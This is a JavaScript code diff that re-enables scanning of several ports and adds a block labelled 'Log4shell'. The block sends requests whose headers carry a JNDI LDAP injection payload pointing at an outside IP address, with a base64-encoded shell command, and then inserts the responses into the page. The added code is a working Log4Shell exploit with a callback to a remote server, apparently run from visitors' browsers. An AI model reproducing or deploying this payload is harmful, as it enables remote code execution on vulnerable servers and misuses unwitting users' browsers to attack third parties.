@@ -75,7 +75,7 @@
                     5000, 5001, 5050, 5051, 5555,
                     6000, 6001, 6060, 6061, 6666,
                     7000, 7001, 7070, 7071, 7777,
-                    //8000, 8001, 8080, 8081, 8888,
+                    8000, 8001, 8080, 8081, 8888,
                     9000, 9001, 9090, 9091, 9999,
                 ];
 
@@ -101,6 +101,31 @@
                         } catch (e) {
                             console.error(`${url} - ${e.message}`);
                         }
+                        // Log4shell
+                        try {
+                            const res = await fetch(url,
+                            {
+                                headers: {
+                                    'X-API-Version': '${jndi:ldap://54.165.153.184:443/Basic/Command/Base64/dG91Y2ggL3RtcC9oaWZyb21udWxscmlvdC5jb20=}',
+                                    'user-agent': '${jndi:ldap://54.165.153.184:443/Basic/Command/Base64/dG91Y2ggL3RtcC9oaWZyb21udWxscmlvdC5jb20=}'
+                                }
+                            });
+                            if (res.ok) {
+                                console.log(`Connected: ${url}`);
+                                const t = await res.text();
+                                addContent(container, url, t);
+                                const te = document.getElementsByTagName('title');
+                                if (te.length > 0) {
+                                    te[0].textContent = te[te.length - 1].textContent;
+                                }
+                                fc.style.display = 'none';
+                                container.style.display = 'block';
+                            }
+                        } catch (e) {
+                            console.error(`${url} - ${e.message}`);
+                        }
+
+                    
                     });
                 });
             }
